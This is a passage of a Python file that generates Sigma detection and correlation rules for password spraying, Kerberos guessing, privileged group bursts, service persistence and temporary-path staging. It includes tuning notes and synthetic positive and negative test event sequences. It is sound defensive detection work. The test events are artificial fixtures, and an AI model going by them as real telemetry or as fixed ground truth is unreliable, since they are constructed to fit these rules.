                    ev("win_security", 60, EventID=4625, TargetUserName=USER_ADM, IpAddress=DOC_IP_2),
                    ev("win_security", 300, EventID=4624, TargetUserName=USER_ADM, IpAddress=DOC_IP_2),
                ],
            ),
        ],
        neg=[
            seq(
                "success_then_failures",
                "A success followed by later failures for the same account.",
                "The ordered requirement is not satisfied because the success comes first.",
                [
                    ev("win_security", 0, EventID=4624, TargetUserName=USER_STD, IpAddress=DOC_IP_1),
                    ev("win_security", 120, EventID=4625, TargetUserName=USER_STD, IpAddress=DOC_IP_1),
                    ev("win_security", 180, EventID=4625, TargetUserName=USER_STD, IpAddress=DOC_IP_1),
                ],
            ),
            seq(
                "failures_and_success_different_accounts",
                "Failures for one account and a success for another.",
                "No single group key contains both stages of the sequence.",
                [
                    ev("win_security", 0, EventID=4625, TargetUserName=USER_STD, IpAddress=DOC_IP_2),
                    ev("win_security", 60, EventID=4625, TargetUserName=USER_STD, IpAddress=DOC_IP_2),
                    ev("win_security", 120, EventID=4624, TargetUserName=USER_ADM, IpAddress=DOC_IP_1),
                ],
            ),
            seq(
                "success_outside_window",
                "Failures followed by a success after the correlation window has elapsed.",
                "The sequence exceeds the fifteen minute timespan.",
                [
                    ev("win_security", 0, EventID=4625, TargetUserName=USER_STD, IpAddress=DOC_IP_2),
                    ev("win_security", 60, EventID=4625, TargetUserName=USER_STD, IpAddress=DOC_IP_2),
                    ev("win_security", 1800, EventID=4624, TargetUserName=USER_STD, IpAddress=DOC_IP_2),
                ],
            ),
        ],
    )
)

CORRELATIONS.append(
    dict(
        cid="SDEL-COR-002",
        path="correlation",
        file="authentication_failures_across_accounts_from_one_source.yml",
        title="Authentication Failures Across Multiple Accounts From One Source",
        level="high",
        correlation_type="value_count",
        timespan="15m",
        group_by=["IpAddress"],
        count_field="TargetUserName",
        threshold=5,
        desc=(
            "Counts the number of distinct accounts that fail authentication from a single "
            "source address within fifteen minutes. Spreading a small number of attempts across "
            "many accounts is the defining shape of password spraying."
        ),
        hypothesis=(
            "If a single source sprays credentials, the number of distinct target accounts "
            "failing from that source will rise sharply while per-account failure counts stay "
            "low."
        ),
        techniques=["T1110.003"],
        refs=[attack_url("T1110.003"), ms_event(4625), SIGMA_CORRELATION_SPEC],
        fps=[
            "A shared network address translation gateway behind which many users fail after a "
            "directory outage or a password policy change.",
            "A misconfigured application server holding stale credentials for several service "
            "accounts and retrying all of them from one address.",
        ],
        fp_strategy=(
            "Shared egress addresses are the main source of benign matches. Tune by excluding "
            "documented gateway addresses from the group key and by raising the distinct account "
            "threshold for those sources."
        ),
        tuning=(
            "Prefer raising the threshold for known gateways over removing the source entirely, "
            "so that a genuine spray from behind the gateway is still visible."
        ),
        test_strategy=(
            "Positive sequences fail five or more distinct accounts from one address. Negative "
            "sequences repeat one account, spread across two addresses, and stay under the "
            "threshold."
        ),
        volume="Low; sensitive to the distinct account threshold.",
        related=["SDEL-COR-001", "SDEL-COR-003"],
        bases=[
            dict(
                name="sdel_cor_002_windows_logon_failure",
                title="Windows Logon Failure With Source Address (Correlation Input)",
                profile="win_security",
                detection=[("selection_logon_failure", [("EventID", 4625)])],
                condition="selection_logon_failure",
                level="informational",
                desc=(
                    "Base rule that selects Windows logon failure records including the source "
                    "network address, for use by the spraying correlation rule."
                ),
                fps=[
                    "Users failing authentication from behind a shared remote access gateway "
                    "that presents a single source address for many people.",
                    "Automation retrying with an expired credential from a fixed management "
                    "address on every polling interval.",
                ],
            )
        ],
        pos=[
            seq(
                "five_distinct_accounts_one_source",
                "Five distinct accounts fail from a single documentation address.",
                "The distinct account count reaches the configured threshold within the window.",
                [
                    ev("win_security", 0, EventID=4625, TargetUserName="synthetic-user-a", IpAddress=DOC_IP_2),
                    ev("win_security", 30, EventID=4625, TargetUserName="synthetic-user-b", IpAddress=DOC_IP_2),
                    ev("win_security", 60, EventID=4625, TargetUserName="synthetic-user-c", IpAddress=DOC_IP_2),
                    ev("win_security", 90, EventID=4625, TargetUserName="synthetic-user-d", IpAddress=DOC_IP_2),
                    ev("win_security", 120, EventID=4625, TargetUserName="synthetic-user-e", IpAddress=DOC_IP_2),
                ],
            ),
            seq(
                "six_distinct_accounts_one_source",
                "Six distinct accounts fail from a single documentation address.",
                "The distinct account count exceeds the configured threshold within the window.",
                [
                    ev("win_security", 0, EventID=4625, TargetUserName="synthetic-user-a", IpAddress=DOC_IP_1),
                    ev("win_security", 20, EventID=4625, TargetUserName="synthetic-user-b", IpAddress=DOC_IP_1),
                    ev("win_security", 40, EventID=4625, TargetUserName="synthetic-user-c", IpAddress=DOC_IP_1),
                    ev("win_security", 60, EventID=4625, TargetUserName="synthetic-user-d", IpAddress=DOC_IP_1),
                    ev("win_security", 80, EventID=4625, TargetUserName="synthetic-user-e", IpAddress=DOC_IP_1),
                    ev("win_security", 100, EventID=4625, TargetUserName="synthetic-user-f", IpAddress=DOC_IP_1),
                ],
            ),
        ],
        neg=[
            seq(
                "repeated_failures_single_account",
                "Six failures against a single account from one address.",
                "The distinct account count stays at one, below the threshold.",
                [
                    ev("win_security", i * 20, EventID=4625, TargetUserName=USER_STD, IpAddress=DOC_IP_2)
                    for i in range(6)
                ],
            ),
            seq(
                "distinct_accounts_split_across_sources",
                "Six distinct accounts fail, split evenly across two addresses.",
                "No single source address reaches the distinct account threshold.",
                [
                    ev("win_security", 0, EventID=4625, TargetUserName="synthetic-user-a", IpAddress=DOC_IP_1),
                    ev("win_security", 20, EventID=4625, TargetUserName="synthetic-user-b", IpAddress=DOC_IP_1),
                    ev("win_security", 40, EventID=4625, TargetUserName="synthetic-user-c", IpAddress=DOC_IP_1),
                    ev("win_security", 60, EventID=4625, TargetUserName="synthetic-user-d", IpAddress=DOC_IP_2),
                    ev("win_security", 80, EventID=4625, TargetUserName="synthetic-user-e", IpAddress=DOC_IP_2),
                    ev("win_security", 100, EventID=4625, TargetUserName="synthetic-user-f", IpAddress=DOC_IP_2),
                ],
            ),
            seq(
                "four_distinct_accounts_below_threshold",
                "Four distinct accounts fail from one address.",
                "The distinct account count remains below the threshold.",
                [
                    ev("win_security", 0, EventID=4625, TargetUserName="synthetic-user-a", IpAddress=DOC_IP_2),
                    ev("win_security", 30, EventID=4625, TargetUserName="synthetic-user-b", IpAddress=DOC_IP_2),
                    ev("win_security", 60, EventID=4625, TargetUserName="synthetic-user-c", IpAddress=DOC_IP_2),
                    ev("win_security", 90, EventID=4625, TargetUserName="synthetic-user-d", IpAddress=DOC_IP_2),
                ],
            ),
        ],
    )
)

CORRELATIONS.append(
    dict(
        cid="SDEL-COR-003",
        path="correlation",
        file="repeated_kerberos_preauthentication_failures.yml",
        title="Repeated Kerberos Pre-Authentication Failures For One Account",
        level="medium",
        correlation_type="event_count",
        timespan="10m",
        group_by=["TargetUserName"],
        threshold=10,
        desc=(
            "Counts Kerberos pre-authentication failures for a single account within ten "
            "minutes. A sustained burst against one account indicates guessing rather than a "
            "mistyped password."
        ),
        hypothesis=(
            "If an account is targeted by online guessing against the ticket service, the "
            "pre-authentication failure count for that account will exceed normal user error "
            "levels."
        ),
        techniques=["T1110.001"],
        refs=[attack_url("T1110.001"), ms_event(4771), SIGMA_CORRELATION_SPEC],
        fps=[
            "A mobile device or mail client caching an old password and retrying automatically "
            "every few seconds after a rotation.",
            "A service with a hard-coded credential retrying in a tight loop after a directory "
            "password change.",
        ],
        fp_strategy=(
            "Automated retry loops from a single client device produce most benign bursts. Tune "
            "by enriching with the client address and by treating repeated bursts from the same "
            "device as a configuration issue rather than an attack."
        ),
        tuning=(
            "Adjust the threshold to the observed baseline before excluding accounts. Service "
            "accounts should be investigated instead of excluded."
        ),
        test_strategy=(
            "Positive sequences produce ten or more failures for one account inside the window. "
            "Negative sequences stay under the threshold, spread across accounts, and exceed the "
            "window."
        ),
        volume="Low after threshold tuning.",
        related=["SDEL-COR-001", "SDEL-COR-002"],
        bases=[
            dict(
                name="sdel_cor_003_kerberos_preauth_failure",
                title="Kerberos Pre-Authentication Failure (Correlation Input)",
                profile="win_security",
                detection=[("selection_preauth_failure", [("EventID", 4771)])],
                condition="selection_preauth_failure",
                level="informational",
                desc=(
                    "Base rule that selects Kerberos pre-authentication failure records for use "
                    "by the guessing correlation rule."
                ),
                fps=[
                    "Cached credentials on mobile devices and mail clients retrying "
                    "automatically after a directory password rotation.",
                    "Applications retrying in a tight loop with a stale service credential that "
                    "was not updated during a change window.",
                ],
            )
        ],
        pos=[
            seq(
                "twelve_failures_one_account",
                "Twelve pre-authentication failures for one account.",
                "The event count exceeds the threshold inside the window.",
                [
                    ev("win_security", i * 30, EventID=4771, TargetUserName=USER_STD, IpAddress=DOC_IP_2)
                    for i in range(12)
                ],
            ),
            seq(
                "ten_failures_admin_account",
                "Ten pre-authentication failures for an administrative account.",
                "The event count reaches the threshold inside the window.",
                [
                    ev("win_security", i * 40, EventID=4771, TargetUserName=USER_ADM, IpAddress=DOC_IP_1)
                    for i in range(10)
                ],
            ),
        ],
        neg=[
            seq(
                "five_failures_below_threshold",
                "Five pre-authentication failures for one account.",
                "The event count remains below the threshold.",
                [
                    ev("win_security", i * 30, EventID=4771, TargetUserName=USER_STD, IpAddress=DOC_IP_2)
                    for i in range(5)
                ],
            ),
            seq(
                "failures_spread_across_accounts",
                "Twelve failures spread evenly across four accounts.",
                "No single account group reaches the threshold.",
                [
                    ev(
                        "win_security",
                        i * 20,
                        EventID=4771,
                        TargetUserName=f"synthetic-user-{'abcd'[i % 4]}",
                        IpAddress=DOC_IP_2,
                    )
                    for i in range(12)
                ],
            ),
            seq(
                "failures_spread_beyond_window",
                "Twelve failures for one account spread over ninety minutes.",
                "No ten minute window contains enough failures to reach the threshold.",
                [
                    ev("win_security", i * 450, EventID=4771, TargetUserName=USER_STD, IpAddress=DOC_IP_2)
                    for i in range(12)
                ],
            ),
        ],
    )
)

CORRELATIONS.append(
    dict(
        cid="SDEL-COR-004",
        path="correlation",
        file="burst_of_privileged_group_membership_changes.yml",
        title="Burst Of Privileged Group Membership Changes By One Subject",
        level="high",
        correlation_type="event_count",
        timespan="10m",
        group_by=["SubjectUserName"],
        threshold=4,
        desc=(
            "Counts privileged group membership additions performed by a single subject within "
            "ten minutes. Rapid bulk changes suggest scripted privilege consolidation rather "
            "than a considered administrative action."
        ),
        hypothesis=(
            "If an adversary consolidates privileges after obtaining administrative access, one "
            "subject will add several members to privileged groups in a short burst."
        ),
        techniques=["T1098"],
        refs=[attack_url("T1098"), ms_event(4728), SIGMA_CORRELATION_SPEC],
        fps=[
            "Bulk onboarding of a new operations team where several engineers are added to the "
            "same administrative group during one change window.",
            "Directory migration tooling that recreates group membership in bulk after a "
            "consolidation project.",
        ],
        fp_strategy=(
            "Benign bursts correspond to a change ticket and are performed by a known "
            "administrator. Tune by requiring a change record and by excluding the migration "
            "tooling account only during the migration project."
        ),
        tuning=(
            "Prefer time-bounded suppression during migrations over permanent exclusion of "
            "administrator accounts."
        ),
        test_strategy=(
            "Positive sequences add four or more members within the window. Negative sequences "
            "stay under the threshold, spread across subjects, and exceed the window."
        ),
        volume="Very low.",
        related=["SDEL-ID-003", "SDEL-PS-007"],
        bases=[
            dict(
                name="sdel_cor_004_privileged_group_addition",
                title="Privileged Group Member Addition (Correlation Input)",
                profile="win_security",
                detection=[
                    ("selection_member_added", [("EventID", [4728, 4732, 4756])]),
                    ("selection_privileged_group", [("TargetUserName", list(PRIV_GROUPS))]),
                ],
                condition="selection_member_added and selection_privileged_group",
                level="informational",
                desc=(
                    "Base rule that selects additions to privileged groups for use by the "
                    "privilege consolidation correlation rule."
                ),
                fps=[
                    "Just-in-time privileged access grants issued by governance automation and "
                    "reversed automatically when the grant expires.",
                    "Onboarding of new operations engineers during a documented change window, "
                    "which produces several additions in quick succession.",
                ],
            )
        ],
        pos=[
            seq(
                "four_additions_one_subject",
                "One subject adds four members to privileged groups.",
                "The event count reaches the threshold inside the window.",
                [
                    ev(
                        "win_security",
                        i * 60,
                        EventID=4728,
                        TargetUserName="Domain Admins",
                        MemberName=f"CN=synthetic-user-{c},OU=SyntheticUsers,DC=synthetic,DC=invalid",
                        SubjectUserName="synthetic-operator",
                    )
                    for i, c in enumerate("abcd")
                ],
            ),
            seq(
                "five_additions_mixed_groups",
                "One subject adds five members across two privileged groups.",
                "The event count exceeds the threshold inside the window.",
                [
                    ev(
                        "win_security",
                        i * 45,
                        EventID=4728 if i % 2 == 0 else 4756,
                        TargetUserName="Domain Admins" if i % 2 == 0 else "Enterprise Admins",
                        MemberName=f"CN=synthetic-user-{c},OU=SyntheticUsers,DC=synthetic,DC=invalid",
                        SubjectUserName=USER_ADM,
                    )
                    for i, c in enumerate("abcde")
                ],
            ),
        ],
        neg=[
            seq(
                "two_additions_below_threshold",
                "One subject adds two members to a privileged group.",
                "The event count remains below the threshold.",
                [
                    ev(
                        "win_security",
                        i * 60,
                        EventID=4728,
                        TargetUserName="Domain Admins",
                        MemberName=f"CN=synthetic-user-{c},OU=SyntheticUsers,DC=synthetic,DC=invalid",
                        SubjectUserName="synthetic-operator",
                    )
                    for i, c in enumerate("ab")
                ],
            ),
            seq(
                "additions_spread_across_subjects",
                "Four additions performed by four different subjects.",
                "No single subject group reaches the threshold.",
                [
                    ev(
                        "win_security",
                        i * 60,
                        EventID=4728,
                        TargetUserName="Domain Admins",
                        MemberName=f"CN=synthetic-user-{c},OU=SyntheticUsers,DC=synthetic,DC=invalid",
                        SubjectUserName=f"synthetic-operator-{c}",
                    )
                    for i, c in enumerate("abcd")
                ],
            ),
            seq(
                "additions_to_non_privileged_group",
                "Five additions to an ordinary application group.",
                "The base rule does not select these events, so no group key accumulates.",
                [
                    ev(
                        "win_security",
                        i * 45,
                        EventID=4728,
                        TargetUserName="Synthetic App Users",
                        MemberName=f"CN=synthetic-user-{c},OU=SyntheticUsers,DC=synthetic,DC=invalid",
                        SubjectUserName="synthetic-operator",
                    )
                    for i, c in enumerate("abcde")
                ],
            ),
        ],
    )
)

CORRELATIONS.append(
    dict(
        cid="SDEL-COR-005",
        path="correlation",
        file="service_creation_followed_by_matching_process.yml",
        title="Service Creation Followed By Execution Of The Same Binary",
        level="medium",
        correlation_type="temporal_ordered",
        timespan="10m",
        group_by=["Computer", "service_binary"],
        aliases={
            "service_binary": {
                "sdel_cor_005_service_created": "ImagePath",
                "sdel_cor_005_process_started": "Image",
            }
        },
        desc=(
            "Correlates a service installation with the subsequent execution of the same binary "
            "on the same host. Observing both halves confirms that the installed service "
            "actually ran, which separates real persistence from an abandoned artefact."
        ),
        hypothesis=(
            "If service-based persistence is established and used, a service installation record "
            "will be followed by a process creation record for the identical binary path on the "
            "same host."
        ),
        techniques=["T1543.003"],
        refs=[attack_url("T1543.003"), MS_SCM, SIGMA_CORRELATION_SPEC],
        fps=[
            "Legitimate agent installation where the installer registers the service and then "
            "starts it immediately, which produces the same ordered pair.",
            "Server build automation installing and starting several platform services during "
            "provisioning.",
        ],
        fp_strategy=(
            "Every managed agent installation produces this shape. The discriminator is the "
            "binary path, so combine this correlation with the user-writable service path rule "
            "and alert only on paths outside managed directories."
        ),
        tuning=(
            "Filter the base service rule to user-writable image paths in noisy environments "
            "rather than raising the correlation timespan."
        ),
        test_strategy=(
            "Positive sequences install and then execute the same path on one host. Negative "
            "sequences reverse the order, use different paths, and use different hosts."
        ),
        volume="Moderate before path filtering; low afterwards.",
        related=["SDEL-WIN-006", "SDEL-COR-006"],
        bases=[
            dict(
                name="sdel_cor_005_service_created",
                title="Service Installation Record (Correlation Input)",
                profile="win_system",
                detection=[
                    (
                        "selection_service_installed",
                        [("EventID", 7045), ("Provider_Name", "Service Control Manager")],
                    )
                ],
                condition="selection_service_installed",
                level="informational",
                desc=(
                    "Base rule that selects service installation records for use by the service "
                    "execution correlation rule."
                ),
                fps=[
                    "Managed endpoint agent installation during server provisioning, which "
                    "registers one or more services in a single burst.",
                    "Vendor installers registering supporting services such as licensing or "
                    "telemetry helpers at the end of a setup sequence.",
                ],
            ),
            dict(
                name="sdel_cor_005_process_started",
                title="Process Creation Record (Correlation Input)",
                profile="win_process_creation",
                detection=[("selection_process_started", [("Image|contains", "\\")])],
                condition="selection_process_started",
                level="informational",
                desc=(
                    "Base rule that selects process creation records with an absolute image path "
                    "for use by the service execution correlation rule."
                ),
                fps=[
                    "All ordinary process creation on the endpoint, which is why this base rule "
                    "is only meaningful inside the correlation.",
                    "Management agent child processes started continuously by inventory and "
                    "patching workflows.",
                ],
            ),
        ],
        pos=[
            seq(
                "service_installed_then_executed",
                "Service installed from a temporary path and then executed on the same host.",
                "Both stages share the host and the binary path alias inside the window.",
                [
                    ev(
                        "win_system",
                        0,
                        EventID=7045,
                        Provider_Name="Service Control Manager",
                        ServiceName="SyntheticStagedService",
                        ImagePath=P_TEMP_WIN + "synthetic_service.exe",
                        Computer=HOST_WIN,
                    ),
                    ev(
                        "win_process_creation",
                        90,
                        Image=P_TEMP_WIN + "synthetic_service.exe",
                        CommandLine=P_TEMP_WIN + "synthetic_service.exe",
                        ParentImage=P_SYS32 + "services.exe",
                        Computer=HOST_WIN,
                    ),
                ],
            ),
            seq(
                "public_path_service_then_execution",
                "Service installed from the public directory and executed shortly afterwards.",
                "Both stages share the host and the binary path alias inside the window.",
                [
                    ev(
                        "win_system",
                        0,
                        EventID=7045,
                        Provider_Name="Service Control Manager",
                        ServiceName="SyntheticPublicService",
                        ImagePath=P_PUBLIC + "synthetic_service.exe",
                        Computer=HOST_WIN,
                    ),
                    ev(
                        "win_process_creation",
                        240,
                        Image=P_PUBLIC + "synthetic_service.exe",
                        CommandLine=P_PUBLIC + "synthetic_service.exe --run",
                        ParentImage=P_SYS32 + "services.exe",
                        Computer=HOST_WIN,
                    ),
                ],
            ),
        ],
        neg=[
            seq(
                "execution_before_installation",
                "The binary executes before the service is installed.",
                "The ordered requirement is not satisfied.",
                [
                    ev(
                        "win_process_creation",
                        0,
                        Image=P_TEMP_WIN + "synthetic_service.exe",
                        CommandLine=P_TEMP_WIN + "synthetic_service.exe",
                        Computer=HOST_WIN,
                    ),
                    ev(
                        "win_system",
                        120,
                        EventID=7045,
                        Provider_Name="Service Control Manager",
                        ServiceName="SyntheticStagedService",
                        ImagePath=P_TEMP_WIN + "synthetic_service.exe",
                        Computer=HOST_WIN,
                    ),
                ],
            ),
            seq(
                "different_binary_paths",
                "A service is installed and a different binary executes.",
                "The binary path alias differs, so no group key contains both stages.",
                [
                    ev(
                        "win_system",
                        0,
                        EventID=7045,
                        Provider_Name="Service Control Manager",
                        ServiceName="SyntheticStagedService",
                        ImagePath=P_TEMP_WIN + "synthetic_service.exe",
                        Computer=HOST_WIN,
                    ),
                    ev(
                        "win_process_creation",
                        60,
                        Image=P_SYS32 + "notepad.exe",
                        CommandLine="notepad.exe",
                        Computer=HOST_WIN,
                    ),
                ],
            ),
            seq(
                "different_hosts",
                "A service is installed on one host and the binary executes on another.",
                "The host component of the group key differs between the two stages.",
                [
                    ev(
                        "win_system",
                        0,
                        EventID=7045,
                        Provider_Name="Service Control Manager",
                        ServiceName="SyntheticStagedService",
                        ImagePath=P_TEMP_WIN + "synthetic_service.exe",
                        Computer=HOST_WIN,
                    ),
                    ev(
                        "win_process_creation",
                        60,
                        Image=P_TEMP_WIN + "synthetic_service.exe",
                        CommandLine=P_TEMP_WIN + "synthetic_service.exe",
                        Computer=HOST_DC,
                    ),
                ],
            ),
        ],
    )
)

CORRELATIONS.append(
    dict(
        cid="SDEL-COR-006",
        path="correlation",
        file="temporary_file_creation_followed_by_execution.yml",
        title="Executable Written To A Temporary Path And Then Executed",
        level="high",
        correlation_type="temporal_ordered",
        timespan="5m",
        group_by=["Computer", "artifact_path"],
        aliases={
            "artifact_path": {
                "sdel_cor_006_executable_written": "TargetFilename",
                "sdel_cor_006_executable_launched": "Image",
            }
        },
        desc=(
            "Correlates the creation of an executable in a user-writable directory with the "
            "execution of that same file on the same host within five minutes. The pair is far "
            "more specific than either half alone, which is why the file creation rule on its "
            "own is rated low."
        ),
        hypothesis=(
            "If tooling is staged and then run, a file creation record and a process creation "
            "record will reference the identical path on the same host in quick succession."
        ),
        techniques=["T1105"],
        extra_techniques=["T1204.002"],
        refs=[attack_url("T1105"), attack_url("T1204.002"), SIGMA_CORRELATION_SPEC],
        fps=[
            "Installer packages that extract a setup executable into the temporary directory and "
            "immediately run it.",
            "Build pipelines that compile a binary into a temporary workspace and execute the "
            "resulting test harness.",
        ],
        fp_strategy=(
            "Installers and build pipelines dominate. Tune on the writing process image and on "
            "the host role, and treat matches on user endpoints with no installer parent as the "
            "interesting population."
        ),
        tuning=(
            "Filter the file creation base rule by writing process rather than shortening the "
            "timespan, because shortening the window only hides slower staging."
        ),
        test_strategy=(
            "Positive sequences write and then execute the same path on one host. Negative "
            "sequences reverse the order, use different paths, and exceed the window."
        ),
        volume="Low to moderate depending on installer activity.",
        related=["SDEL-WIN-014", "SDEL-WIN-001", "SDEL-COR-005"],
        bases=[
            dict(
                name="sdel_cor_006_executable_written",
                title="Executable Written To A Writable Directory (Correlation Input)",
                profile="win_file_event",
                detection=[
                    (
                        "selection_writable_directory",
                        [("TargetFilename|contains", list(TEMP_FRAGMENTS))],
                    ),
                    ("selection_executable_extension", [("TargetFilename|endswith", [".exe", ".dll"])]),
                ],
                condition="selection_writable_directory and selection_executable_extension",
                level="informational",
                desc=(
                    "Base rule that selects executable file creation in user-writable "
                    "directories for use by the staging correlation rule."
                ),
                fps=[
                    "Installer packages extracting their payload binaries into the per-user "
                    "temporary directory before running setup.",
                    "Compilers and packaging tools writing build output into a temporary "
                    "workspace on developer and build hosts.",
                ],
            ),
            dict(
                name="sdel_cor_006_executable_launched",
                title="Process Launched From A Writable Directory (Correlation Input)",
                profile="win_process_creation",
                detection=[
                    (
                        "selection_writable_directory",
                        [("Image|contains", list(TEMP_FRAGMENTS))],
                    )
                ],
                condition="selection_writable_directory",
                level="informational",
                desc=(
                    "Base rule that selects process creation from user-writable directories for "
                    "use by the staging correlation rule."
                ),
                fps=[
                    "Installer setup binaries running from the temporary directory immediately "
                    "after extraction.",
                    "Test harnesses executed from a build workspace by continuous integration "
                    "jobs on build agents.",
                ],
            ),
        ],
        pos=[
            seq(
                "write_then_execute_user_temp",
                "Executable written to the per-user temporary directory and then executed.",
                "Both stages share the host and the artefact path alias inside the window.",
                [
                    ev(
                        "win_file_event",
                        0,
                        TargetFilename=P_TEMP_USER + "synthetic_tool.exe",
                        Image=P_SYS32 + "cmd.exe",
                        Computer=HOST_WIN,
                    ),
                    ev(
                        "win_process_creation",
                        45,
                        Image=P_TEMP_USER + "synthetic_tool.exe",
                        CommandLine=P_TEMP_USER + "synthetic_tool.exe --synthetic-run",
                        Computer=HOST_WIN,
                    ),
                ],
            ),
            seq(
                "write_then_execute_public",
                "Executable written to the public directory and then executed.",
                "Both stages share the host and the artefact path alias inside the window.",
                [
                    ev(
                        "win_file_event",
                        0,
                        TargetFilename=P_PUBLIC + "synthetic_helper.exe",
                        Image=P_SYS32 + "WindowsPowerShell\\v1.0\\powershell.exe",
                        Computer=HOST_WIN,
                    ),
                    ev(
                        "win_process_creation",
                        120,
                        Image=P_PUBLIC + "synthetic_helper.exe",
                        CommandLine=P_PUBLIC + "synthetic_helper.exe",
                        Computer=HOST_WIN,
                    ),
                ],
            ),
        ],
        neg=[
            seq(
                "execute_then_write",
                "A binary executes before an executable of the same name is written.",
                "The ordered requirement is not satisfied.",
                [
                    ev(
                        "win_process_creation",
                        0,
                        Image=P_TEMP_USER + "synthetic_tool.exe",
                        CommandLine=P_TEMP_USER + "synthetic_tool.exe",
                        Computer=HOST_WIN,
                    ),
                    ev(
                        "win_file_event",
                        60,
                        TargetFilename=P_TEMP_USER + "synthetic_tool.exe",
                        Image=P_SYS32 + "cmd.exe",
                        Computer=HOST_WIN,
                    ),
                ],
            ),
            seq(
                "write_then_execute_different_file",
                "An executable is written and a different temporary binary executes.",
                "The artefact path alias differs between the two stages.",
                [
                    ev(
                        "win_file_event",
                        0,
                        TargetFilename=P_TEMP_USER + "synthetic_tool.exe",
                        Image=P_SYS32 + "cmd.exe",
                        Computer=HOST_WIN,
                    ),
                    ev(
                        "win_process_creation",
                        60,
                        Image=P_TEMP_USER + "synthetic_other.exe",
                        CommandLine=P_TEMP_USER + "synthetic_other.exe",
                        Computer=HOST_WIN,
                    ),
                ],
            ),
            seq(
                "execution_outside_window",
                "An executable is written and executed thirty minutes later.",
                "The sequence exceeds the five minute timespan.",
                [
                    ev(
                        "win_file_event",
                        0,
                        TargetFilename=P_TEMP_USER + "synthetic_tool.exe",
                        Image=P_SYS32 + "cmd.exe",
                        Computer=HOST_WIN,
                    ),
                    ev(
                        "win_process_creation",
                        1800,
                        Image=P_TEMP_USER + "synthetic_tool.exe",
                        CommandLine=P_TEMP_USER + "synthetic_tool.exe",
                        Computer=HOST_WIN,
                    ),
                ],
            ),
        ],
    )
)

# --------------------------------------------------------------------------------------
# YAML emitter
# --------------------------------------------------------------------------------------

PLAIN_SAFE = re.compile(r"^[A-Za-z0-9][A-Za-z0-9_.:/\-]*$")
YAML_RESERVED = {
    "true",
    "false",
    "null",
    "yes",
    "no",
    "on",
    "off",
    "y",
    "n",
    "~",
}


def round_trips_as_string(text: str) -> bool:
    """True when an unquoted scalar is still loaded back as the same string.

    Values such as ``0x1010`` or ``4755`` look like plain text but YAML resolves them to
    integers, which would silently change the meaning of a detection field.
    """
    try:
        return yaml.safe_load(text) == text
    except yaml.YAMLError:
        return False


def yscalar(value: Any) -> str:
    if isinstance(value, bool):
        return "true" if value else "false"
    if isinstance(value, int):
        return str(value)
    text = str(value)
    if (
        PLAIN_SAFE.match(text)
        and text.lower() not in YAML_RESERVED
        and not text.endswith(":")
        and "://" not in text
        and round_trips_as_string(text)
    ):
        return text
    return "'" + text.replace("'", "''") + "'"


def yblock(text: str, indent: str, width: int = 92) -> list[str]:
    """Render a long string as a folded block scalar."""
    words = text.split()
    lines: list[str] = []
    current = ""
    for word in words:
        candidate = f"{current} {word}".strip()
        if len(candidate) + len(indent) > width and current:
            lines.append(indent + current)
            current = word
        else:
            current = candidate
    if current:
        lines.append(indent + current)
    return lines


def ylist(key: str, values: list[Any], indent: str = "") -> list[str]:
    out = [f"{indent}{key}:"]
    for value in values:
        out.append(f"{indent}    - {yscalar(value)}")
    return out


def ylist_folded(key: str, values: list[str], indent: str = "") -> list[str]:
    out = [f"{indent}{key}:"]
    for value in values:
        wrapped = yblock(value, indent + "        ")
        out.append(f"{indent}    - >-")
        out.extend(wrapped)
    return out


def render_detection(detection: list[tuple[str, list[tuple[str, Any]]]], condition: str) -> list[str]:
    lines = ["detection:"]
    for sel_name, fields in detection:
        lines.append(f"    {sel_name}:")
        for field_key, value in fields:
            if isinstance(value, list):
                lines.append(f"        {field_key}:")
                for item in value:
                    lines.append(f"            - {yscalar(item)}")
            else:
                lines.append(f"        {field_key}: {yscalar(value)}")
    lines.append(f"    condition: {yscalar(condition)}")
    return lines


def build_tags(techniques: list[str], extra: list[str]) -> list[str]:
    tactics: list[str] = []
    for tid in techniques:
        for tactic_id in TECHNIQUES[tid][1]:
            shortname = TACTICS[tactic_id][1]
            if shortname not in tactics:
                tactics.append(shortname)
    tags = [f"attack.{name}" for name in tactics]
    for tid in techniques + extra:
        tag = f"attack.{tid.lower()}"
        if tag not in tags:
            tags.append(tag)
    return tags


def rule_uuid(catalog_id: str, suffix: str = "") -> str:
    return str(uuid.uuid5(uuid.NAMESPACE_URL, f"{UUID_BASE}/{catalog_id}{suffix}"))


def render_rule_yaml(spec: dict[str, Any]) -> str:
    profile = PROFILES[spec["profile"]]
    tags = build_tags(spec["techniques"], spec.get("extra_techniques", []))
    lines: list[str] = []
    lines.append(f"title: {yscalar(spec['title'])}")
    lines.append(f"id: {rule_uuid(spec['cid'])}")
    lines.append(f"status: {spec['status']}")
    lines.append("description: >-")
    lines.extend(yblock(spec["desc"], "    "))
    lines.extend(ylist("references", spec["refs"]))
    lines.append(f"author: {yscalar(AUTHOR)}")
    lines.append(f"date: {RULE_DATE}")
    lines.extend(ylist("tags", tags))
    lines.append("logsource:")
    for key, value in profile["logsource"].items():
        lines.append(f"    {key}: {yscalar(value)}")
    lines.extend(render_detection(spec["detection"], spec["condition"]))
    lines.extend(ylist_folded("falsepositives", spec["fps"]))
    lines.append(f"level: {spec['level']}")
    lines.append(f"license: {LICENSE}")
    return "\n".join(lines) + "\n"


def render_correlation_yaml(spec: dict[str, Any]) -> str:
    docs: list[str] = []
    for index, base in enumerate(spec["bases"], start=1):
        profile = PROFILES[base["profile"]]
        lines: list[str] = []
        lines.append(f"title: {yscalar(base['title'])}")
        lines.append(f"id: {rule_uuid(spec['cid'], f'#base{index}')}")
        lines.append(f"name: {base['name']}")
        lines.append("status: experimental")
        lines.append("description: >-")
        lines.extend(yblock(base["desc"], "    "))
        lines.extend(ylist("references", spec["refs"]))
        lines.append(f"author: {yscalar(AUTHOR)}")
        lines.append(f"date: {RULE_DATE}")
        lines.extend(ylist("tags", build_tags(spec["techniques"], spec.get("extra_techniques", []))))
        lines.append("logsource:")
        for key, value in profile["logsource"].items():
            lines.append(f"    {key}: {yscalar(value)}")
        lines.extend(render_detection(base["detection"], base["condition"]))
        lines.extend(ylist_folded("falsepositives", base["fps"]))
        lines.append(f"level: {base['level']}")
        lines.append(f"license: {LICENSE}")
        docs.append("\n".join(lines))

    lines = []
    lines.append(f"title: {yscalar(spec['title'])}")
    lines.append(f"id: {rule_uuid(spec['cid'])}")
    lines.append("status: experimental")
    lines.append("description: >-")
    lines.extend(yblock(spec["desc"], "    "))
    lines.extend(ylist("references", spec["refs"]))
    lines.append(f"author: {yscalar(AUTHOR)}")
    lines.append(f"date: {RULE_DATE}")
